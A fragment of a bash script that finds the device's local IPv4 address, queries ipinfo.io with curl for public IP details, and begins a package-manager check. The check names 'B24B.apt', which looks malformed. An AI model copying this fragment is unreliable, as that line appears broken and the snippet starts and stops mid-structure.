ifconfig=$(ifconfig | grep netmask | grep 255.255 | cut -d 't' -f2 | cut -d ' ' -f2)
ip_data=$(curl -s ipinfo.io;echo -e "${ifconfig}")&>>/dev/null

else

ifconfig=$(ip -4 addr show dev wlan0 | grep inet | awk '{print $2}')
ip_data=$(curl -s ipinfo.io;echo -e "${ifconfig}")&>>/dev/null

fi

# package manager

if [[ `command -v B24B.apt` ]]; then
